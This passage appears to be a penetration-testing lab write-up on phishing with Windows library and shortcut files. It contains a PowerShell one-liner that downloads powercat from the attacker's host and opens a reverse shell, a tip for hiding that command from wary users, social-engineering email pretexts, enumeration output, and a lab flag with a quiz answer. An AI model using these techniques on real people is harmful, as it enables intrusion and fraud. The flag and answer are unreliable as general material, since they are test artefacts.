+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.45.223&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<ul>
+<li>Now we need to create our <code>.lnk</code> file and add it to the WebDAV share<ul>
+<li>Right click on desktop</li>
+<li>create new shortcut</li>
+<li>point the shorcut to powershell and use another download cradle to load powercat and start the rev shell</li>
+</ul>
+</li>
+</ul>
+<pre><code>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.223:8000/powercat.ps1&#39;); powercat -c 192.168.45.223 -p 4444 -e powershell&quot;
+</code></pre>
+<ul>
+<li><em>If the target is tech savy, place a benign command in front of our rev shell command pushing it out of the visible area of the property menu.</em></li>
+<li>Name the shortcut <code>automatic_configuration</code></li>
+</ul>
+<p>To test;</p>
+<ul>
+<li>Start a netcat listener</li>
+<li>Start the Python HTTP server to deliver powercat.ps1</li>
+<li>Double click the shortcut</li>
+<li>We receive a rev shell!</li>
+</ul>
+<p>Execute the attack;</p>
+<ul>
+<li>Use our webdav share to transfer the config.Library-ms and lnk file to our attacker machine</li>
+<li>IRL we would use a pretext and likely email as the delivery method, example;</li>
+</ul>
+<pre><code>Hello! My name is Dwight, and I&#39;m a new member of the IT Team. 
+
+This week I am completing some configurations we rolled out last week.
+To make this easier, I&#39;ve attached a file that will automatically
+perform each step. Could you download the attachment, open the
+directory, and double-click &quot;automatic_configuration&quot;? Once you
+confirm the configuration in the window that appears, you&#39;re all done!
+
+If you have any questions, or run into any problems, please let me
+know!
+</code></pre>
+<ul>
+<li>In this case we will use WebDAV to simulate the delivery method in our lab</li>
+<li>use <code>smbclient</code> with the <code>-c</code> param to specify <code>&#39;put config.Library-ms&#39;</code></li>
+</ul>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/webdav]
+└─$ ls
+automatic_configuration.lnk  config.Library-ms
+                                                                                         
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/webdav]
+└─$ smbclient //192.168.206.195/share -c &#39;put config.Library-ms&#39;
+Password for [WORKGROUP\m4xx3d0ut]:
+putting file config.Library-ms as \config.Library-ms (2.8 kb/s) (average 2.8 kb/s)
+</code></pre>
+<p>A simulated user executes the file and we get a shell!</p>
+<p>Follow the steps in this section to get code execution on the HR137 (VM Group 1 - VM #2) system by using library and shortcut files. Be aware that after every execution of a .lnk file from the WebDAV share, the library file from the SMB share will be removed. You can find the flag on the desktop of the hsmith user. You can use VM #1 of VM Group 1 to build the library file and shortcut.</p>
+<pre><code class="language-powershell">PS C:\Users\hsmith\Desktop&gt; cat flag.txt
+cat flag.txt
+OS{e136120db43d939e68a8715d8c682b13}
+</code></pre>
+<p>Answer the following question with true or false: Is the .lnk file tagged with the &quot;Mark of the Web&quot; when you execute it in Explorer by double-clicking the Windows library file?</p>
+<pre><code>true
+</code></pre>
+<p>Capstone Exercise: Enumerate the ADMIN (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. Obtain a reverse shell and find the flag on the desktop for the Administrator user. You can use VM #3 of VM Group 2 to prepare your attack.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/win-library-files]
+└─$ nmap --script-help &quot;*&quot; | less
+
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/win-library-files]
+└─$ sudo nmap -sS -sV 192.168.206.199
+[sudo] password for m4xx3d0ut: 
+
+...
+report for 192.168.206.199
+Host is up (0.096s latency).
+Not shown: 992 closed tcp ports (reset)
+PORT    STATE SERVICE       VERSION
+25/tcp  open  smtp          hMailServer smtpd
+80/tcp  open  http          Microsoft IIS httpd 10.0
+110/tcp open  pop3          hMailServer pop3d
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp open  imap          hMailServer imapd
+445/tcp open  microsoft-ds?
+587/tcp open  smtp          hMailServer smtpd
+Service Info: Host: ADMIN; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds
+
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/win-library-files]
+└─$ nmap -v --script &quot;smtp-commands&quot; 192.168.206.199
+
+...
+PORT    STATE SERVICE
+25/tcp  open  smtp
+| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp  open  http
+110/tcp open  pop3
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+143/tcp open  imap
+445/tcp open  microsoft-ds
+587/tcp open  submission
+| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+
+NSE: Script Post-scanning.
+Initiating NSE at 22:20
+Completed NSE at 22:20, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds
+
+...
+PORT      STATE SERVICE       VERSION
+25/tcp    open  tcpwrapped
+80/tcp    open  http          Microsoft IIS httpd 10.0
+110/tcp   open  tcpwrapped
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp   open  tcpwrapped
+445/tcp   open  microsoft-ds?
+587/tcp   open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+...
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/win-library-files]
+└─$ gobuster dir -x pdf -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url http://192.168.206.199
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.206.199
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              pdf
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/info.pdf             (Status: 200) [Size: 676858]
+Progress: 11688 / 283418 (4.12%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 11698 / 283418 (4.13%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<ul>
+<li>Interesting info in <code>info.pdf</code><ul>
+<li>Local email address sytax<ul>
+<li><code>firstname.lastname@supermagicorg.com</code></li>
+</ul>
+</li>
+<li>Test via<ul>
+<li><code>test@supermagicorg.com</code></li>
+</ul>
+</li>
+<li>All accounts of IT staff created and usable<ul>
+<li>CHECK THE METADATA!!!</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/client-side]
+└─$ exiftool -a -u info.pdf 
+ExifTool Version Number         : 12.65
+File Name                       : info.pdf
+Directory                       : .
+File Size                       : 677 kB
+File Modification Date/Time     : 2023:09:09 00:19:13-07:00
+File Access Date/Time           : 2023:09:09 00:19:24-07:00
+File Inode Change Date/Time     : 2023:09:09 00:19:25-07:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 2
+Language                        : de-DE
+Tagged PDF                      : Yes
+XMP Toolkit                     : Image::ExifTool 12.41
+Creator                         : Dave Wizard
+Title                           : Local Communication
+Author                          : Dave Wizard
+Producer                        : Microsoft® PowerPoint® for Microsoft 365
+Create Date                     : 2022:05:17 15:16:38+02:00
+Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
+Modify Date                     : 2022:05:17 15:16:38+02:00
+Document ID                     : uuid:EAB0BD66-875C-4E2E-900D-ECCD665BAAA0
+Instance ID                     : uuid:EAB0BD66-875C-4E2E-900D-ECCD665BAAA0
+Title                           : Local Communication
+Author                          : Dave Wizard
+Create Date                     : 2022:05:17 15:16:38+02:00
+Modify Date                     : 2022:05:17 15:16:38+02:00
+Producer                        : Microsoft® PowerPoint® for Microsoft 365
+Creator                         : Dave Wizard
+
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/win-library-files]
+└─$ nodejs
+Welcome to Node.js v18.13.0.
+Type &quot;.help&quot; for more information.
+&gt; btoa(&#39;test@supermagicorg.com&#39;)
+&#39;dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==&#39;
+&gt; btoa(&#39;test&#39;)
+&#39;dGVzdA==&#39;
+&gt; atob(&#39;VXNlcm5hbWU6&#39;)
+&#39;Username:&#39;
+&gt; atob(&#39;UGFzc3dvcmQ6&#39;)
+&#39;Password:&#39;
+
+PORT    STATE SERVICE
+25/tcp  open  smtp
+| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+110/tcp open  pop3
+143/tcp open  imap
+587/tcp open  submission
+| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+</code></pre>
+<ul>
+<li><code>192.168.206.199</code></li>
+<li>A valid company email will be <code>dave.wizard@supermagicorg.com</code></li>
+<li>We have test u/p from PDF<ul>
+<li><code>test@supermagicorg.com</code></li>
+<li><code>test</code></li>
+</ul>
+</li>
+<li>The SMTP Telnet connection will expect Base64 encoded u/p<ul>
+<li><code>dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQo=</code></li>
+<li><code>dGVzdAo=</code></li>
+</ul>
+</li>
+<li>Pretext (Hackers opening scene, 50% of the time it works every time);</li>
+</ul>
+<pre><code>Hi Dave! This is Mr. Eddie Vedder, from Accounting. I just had a power surge here at home that wiped out a file I was working on. Listen, I&#39;m in big trouble, do you know anything about computers? Right, well my BLT drive on my computer just went AWOL, and I&#39;ve got this big project due tomorrow for Mr. Kawasaki, and if I don&#39;t get it in, he&#39;s gonna ask me to commit Hari Kari... Yeah, well, you know these Japanese management techniques. Could you open the attached config folder and run the auto_config app?
+</code></pre>
+
+      </div>
+    </article>
+  
